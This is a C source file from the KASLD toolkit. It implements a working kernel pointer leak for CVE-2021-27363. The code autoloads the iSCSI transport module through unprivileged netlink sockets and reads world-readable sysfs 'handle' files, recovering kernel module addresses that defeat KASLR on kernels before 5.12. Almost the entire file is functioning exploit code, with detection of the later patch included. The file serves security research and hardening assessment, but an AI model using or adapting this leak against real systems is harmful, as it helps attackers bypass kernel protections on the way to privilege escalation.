// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak kernel pointers to iscsi_transport structs (CVE-2021-27363)
// from /sys/class/iscsi_transport/<transport>/handle in kernels
// through 5.11.3. Discovered by Adam Nichols of GRIMM.
//
// Patched March 2021.
//
// Leak primitive:
//   Data leaked:      kernel pointer to iscsi_transport struct
//   Kernel subsystem: drivers/scsi — /sys/class/iscsi_transport/*/handle
//   Data structure:   struct iscsi_transport (module data pointer)
//   Address type:     virtual (kernel module data)
//   Method:           parsed (sysfs file read)
//   CVE:              CVE-2021-27363
//   Patched:          v5.12 (multiple commits)
//   Status:           fixed in v5.12
//   Access check:     none pre-v5.12 (world-readable sysfs attribute)
//   Source:
//   https://elixir.bootlin.com/linux/v5.11/source/drivers/scsi/scsi_transport_iscsi.c
//
// Mitigations:
//   Patched in v5.12: show_transport_handle() requires CAP_SYS_ADMIN, so an
//   unprivileged read of an otherwise mode-0444 attribute returns -EACCES.
//   Requires CONFIG_SCSI_ISCSI_ATTRS=y/m. The transport class module can be
//   auto-loaded by opening a NETLINK_ISCSI socket (unprivileged). No runtime
//   sysctl can restrict access.
//
// Every driver that calls iscsi_register_transport() gets a directory under
// /sys/class/iscsi_transport/ named after its transport, and the transport
// attribute group (handle, caps) is attached unconditionally — no driver opts
// out. Each transport's handle holds the address of that driver's own static
// struct iscsi_transport. Transport names are driver-private (tcp, iser,
// be2iscsi, bnx2i, qedi, qla4xxx, cxgb3i, cxgb4i, ...), several of them behind
// driver macros, and libcxgbi registers with a struct supplied by another
// module — so the class directory is enumerated and every entry read.
//
// Each handle points into a different module's data, so several registered
// transports yield several independent module-region samples. Each is emitted
// on its own, so every leaked address reaches the engine as a distinct sample
// rather than as one record collapsed from the set.
//
// Registration timing: the NETLINK_ISCSI socket autoloads scsi_transport_iscsi,
// which registers the transport CLASS but no transport. The transports live in
// separate modules loaded by userspace (iscsid, the iscsi systemd units, HBA
// drivers), so a registration can land seconds after the socket call — hence
// the bounded poll. The class directory itself is created by the synchronously
// autoloaded module, so its absence is decided before the poll starts and ends
// the run immediately.
//
// References:
// https://nvd.nist.gov/vuln/detail/CVE-2021-27363
// https://blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html
//
// Output:
// [.] waiting up to 5000ms for an iSCSI transport to register ...
// [.] checking /sys/class/iscsi_transport/iser/handle ...
// leaked iser iscsi_transport address: ffffffffc067b040
// [.] checking /sys/class/iscsi_transport/tcp/handle ...
// leaked tcp iscsi_transport address: ffffffffc0634020
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include <dirent.h>
#include <errno.h>
#include <limits.h>
#include <linux/netlink.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "CVE-2021-27363: /sys/class/iscsi_transport/*/handle exposes the "
    "raw kernel pointer to the struct iscsi_transport, which resides "
    "in kernel module memory. This world-readable sysfs attribute was "
    "not filtered through %pK. Fixed in v5.12 by restricting the "
    "attribute to root.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:virtual\n"
           "cve:CVE-2021-27363\n"
           "patch:v5.12\n"
           "config:CONFIG_SCSI_ISCSI_ATTRS\n");

#define ISCSI_CLASS_DIR "/sys/class/iscsi_transport"

/* Registration arrives via a userspace module load, so the wait is a poll
 * rather than a single check. The budget bounds the delay a transport may take
 * to appear; the interval is coarse enough to cost nothing while the leak is
 * still worth several seconds of patience on a host that has iSCSI in use. */
#define ISCSI_WAIT_BUDGET_MS 5000
#define ISCSI_POLL_INTERVAL_MS 250

/* Outcome of reading one transport's handle. Distinguishes the denied case so
 * the caller can report the v5.12 capability check as a confirmed mitigation
 * rather than a plain miss. */
enum handle_read {
  HANDLE_OK = 0,
  HANDLE_MISSING, /* no handle attribute (or it could not be opened) */
  HANDLE_DENIED,  /* read refused — the CAP_SYS_ADMIN check */
  HANDLE_BAD      /* read, but not a plausible kernel pointer */
};

static long elapsed_ms(const struct timespec *start) {
  struct timespec now;
  if (clock_gettime(CLOCK_MONOTONIC, &now) != 0)
    return LONG_MAX; /* unusable clock: treat the budget as spent */
  return (now.tv_sec - start->tv_sec) * 1000L +
         (now.tv_nsec - start->tv_nsec) / 1000000L;
}

static void poll_sleep(void) {
  struct timespec ts;
  ts.tv_sec = ISCSI_POLL_INTERVAL_MS / 1000;
  ts.tv_nsec = (long)(ISCSI_POLL_INTERVAL_MS % 1000) * 1000000L;
  /* A signal-interrupted sleep just costs an extra loop iteration — the caller
   * bounds the wait on a monotonic deadline, not on an iteration count. */
  nanosleep(&ts, NULL);
}

/* A transport directory name becomes the wire `name` field, which is
 * whitespace-delimited and capped at NAME_LEN. Accept only a conservative
 * identifier set so a malformed directory entry is skipped here rather than
 * producing a line the orchestrator's parser rejects. */
static int transport_name_ok(const char *s) {
  size_t i;
  if (!s || !*s || s[0] == '.')
    return 0;
  for (i = 0; s[i]; i++) {
    char c = s[i];
    if (i >= NAME_LEN - 1)
      return 0;
    if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
          (c >= '0' && c <= '9') || c == '_' || c == '-' || c == '.'))
      return 0;
  }
  return 1;
}

static enum handle_read read_transport_handle(const char *transport,
                                              unsigned long *out) {
  FILE *f;
  char *endptr;
  unsigned long addr;
  /* Class directory + a NAME_LEN-bounded transport name + "/handle". Any
   * KASLD_SYSROOT prefix is applied inside kasld_fopen, not here. */
  char path[256];
  /* Fixed 1024-byte read buffer — constant-sized so the frame stays under
   * -Wvla / -fstack-protector-strong without dipping into the heap. */
  enum { buff_len = 1024 };
  char buff[buff_len];

  *out = 0;
  if (snprintf(path, sizeof(path), ISCSI_CLASS_DIR "/%s/handle", transport) >=
      (int)sizeof(path))
    return HANDLE_MISSING;

  kasld_info("checking %s ...", path);

  errno = 0;
  f = kasld_fopen(path, "rb");
  if (f == NULL)
    return (errno == EACCES || errno == EPERM) ? HANDLE_DENIED : HANDLE_MISSING;

  /* The attribute is mode 0444, so the v5.12 capability check surfaces on the
   * READ rather than the open: sysfs calls show_transport_handle() when the
   * buffer is filled, and it returns -EACCES to a non-CAP_SYS_ADMIN reader. */
  errno = 0;
  if (fgets(buff, buff_len, f) == NULL) {
    int err = errno;
    fclose(f);
    return (err == EACCES || err == EPERM) ? HANDLE_DENIED : HANDLE_MISSING;
  }
  fclose(f);

  if (strlen(buff) > 21)
    return HANDLE_BAD;

  errno = 0;
  addr = strtoul(buff, &endptr, 10);
  if (endptr == buff || errno)
    return HANDLE_BAD;

  /* Accept a pointer-aligned kernel-VAS value (reject userspace/NULL and any
   * misaligned garbage): a real struct iscsi_transport is a static module/.data
   * object, so pointer-aligned. Defense in depth — the handle is printed
   * decimal and never hashed, but this keeps the treatment consistent with the
   * other pointer-leak parsers. The image-vs-module classification happens at
   * emit time in emit_iscsi_transport. */
  if (!addr || (addr & (sizeof(void *) - 1)) != 0 ||
      !kasld_addr_is_kernel_vas(addr))
    return HANDLE_BAD;

  *out = addr;
  return HANDLE_OK;
}

/* The struct iscsi_transport lives in MODULE memory when the driver is built as
 * a module (the usual case), or in the kernel image .data section when built
 * in. Classify by range so a module pointer is tagged REGION_MODULE_BAND, not
 * an image region: a KERNEL_DATA tag on a module pointer feeds
 * image_size_text_data_gap a bogus (>1 GiB) text..data gap, which pushes the
 * Q_VIRT_IMAGE_BASE ceiling below the true base and excludes it.
 *
 * The module test comes FIRST deliberately, and must stay that way. Reversing
 * it looks tempting on riscv64 and s390, where the module band contains the
 * whole kernel-text range and so the second branch below is unreachable -- but
 * on those same arches a genuine module address also falls inside that text
 * range, so a text-first order would tag real module pointers KERNEL_DATA and
 * reproduce exactly the ceiling bug described above. Range classification
 * cannot separate the two where the ranges overlap; what makes the ambiguity
 * harmless is that REGION_MODULE_BAND no longer reaches any rule that moves
 * a text base (module_text_bound and module_text_bracket both require
 * REGION_MODULE), so a mis-tag here is presentational. */
static void emit_iscsi_transport(unsigned long addr, const char *name) {
  if (kasld_addr_is_module_band(addr))
    kasld_result_sample(KASLD_TYPE_VIRT, REGION_MODULE_BAND, addr, name,
                        CONF_PARSED);
  else if (kasld_addr_is_kernel_text(addr))
    kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_DATA, addr, name,
                        CONF_PARSED);
}

/* Count the registered transports without reading their handles. Used as the
 * poll predicate so a registered-but-unreadable transport (a patched kernel)
 * ends the wait immediately instead of being retried for the whole budget. */
static int count_transports(void) {
  DIR *d = kasld_opendir(ISCSI_CLASS_DIR);
  struct dirent *ent;
  int n = 0;

  if (d == NULL)
    return 0;
  while ((ent = readdir(d)) != NULL)
    if (transport_name_ok(ent->d_name))
      n++;
  closedir(d);
  return n;
}

/* Read every registered transport's handle. Returns the number of addresses
 * emitted; reports whether any transport refused the read via *denied. */
static int scan_transports(int *denied) {
  DIR *d = kasld_opendir(ISCSI_CLASS_DIR);
  struct dirent *ent;
  int found = 0;

  *denied = 0;
  if (d == NULL)
    return 0;

  while ((ent = readdir(d)) != NULL) {
    unsigned long addr;
    if (!transport_name_ok(ent->d_name))
      continue;
    switch (read_transport_handle(ent->d_name, &addr)) {
    case HANDLE_OK:
      kasld_found("leaked %s iscsi_transport address: %lx", ent->d_name, addr);
      emit_iscsi_transport(addr, ent->d_name);
      found++;
      break;
    case HANDLE_DENIED:
      *denied = 1;
      break;
    case HANDLE_MISSING:
    case HANDLE_BAD:
      break;
    }
  }
  closedir(d);
  return found;
}

/* Autoload scsi_transport_iscsi (and ib_core) by opening their netlink
 * protocols. Both loads are synchronous — the kernel's request_module() waits
 * for modprobe — so the transport class exists, or never will, by the time this
 * returns. Returns 0 if the iSCSI netlink protocol is unavailable. */
static int trigger_transport_class(void) {
  int sock_fd;

  sock_fd = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_RDMA);
  if (sock_fd >= 0)
    close(sock_fd);

  sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ISCSI);
  if (sock_fd < 0) {
    perror("[-] Failed to get a NETLINK_ISCSI socket");
    return 0;
  }
  close(sock_fd);
  return 1;
}

/* Poll for a transport registration up to the budget. Returns 1 once at least
 * one transport is registered, 0 if the budget expires with none. */
static int wait_for_transport(void) {
  struct timespec start;

  if (count_transports() > 0)
    return 1;

  if (clock_gettime(CLOCK_MONOTONIC, &start) != 0)
    return 0;

  kasld_info("waiting up to %dms for an iSCSI transport to register ...",
             ISCSI_WAIT_BUDGET_MS);

  while (elapsed_ms(&start) < ISCSI_WAIT_BUDGET_MS) {
    poll_sleep();
    if (count_transports() > 0)
      return 1;
  }
  return 0;
}

int main(void) {
  int denied = 0;

  /* KASLD_SYSROOT redirects reads to a copied tree: there is no live module to
   * load and whatever was captured is already present, so skip the trigger and
   * the wait and read the captured class directly. */
  if (!kasld_sysroot()) {
    if (!trigger_transport_class())
      return kasld_disp_absent("NETLINK_ISCSI protocol unavailable");

    /* The class directory is created by scsi_transport_iscsi's own init, which
     * ran synchronously inside the socket call above. Its absence means the
     * module is not present or could not be loaded, and no transport can
     * register beneath a directory that does not exist.
     *
     * Live-only on purpose: a captured tree does not carry this path, so under
     * KASLD_SYSROOT an absent directory says nothing about the captured host
     * and reporting it as a missing prerequisite would blame the target for a
     * gap in the capture. There, an empty scan stays an unexplained miss. */
    if (kasld_access(ISCSI_CLASS_DIR, F_OK) != 0)
      return kasld_disp_absent("no " ISCSI_CLASS_DIR
                               " (CONFIG_SCSI_ISCSI_ATTRS unavailable)");

    wait_for_transport();
  }

  if (scan_transports(&denied) > 0)
    return 0;

  /* A registered transport whose handle refuses the read is the v5.12
   * capability check observed directly. */
  if (denied)
    return kasld_disp_mitigation("CVE-2021-27363",
                                 "handle restricted to CAP_SYS_ADMIN");

  return 0;
}
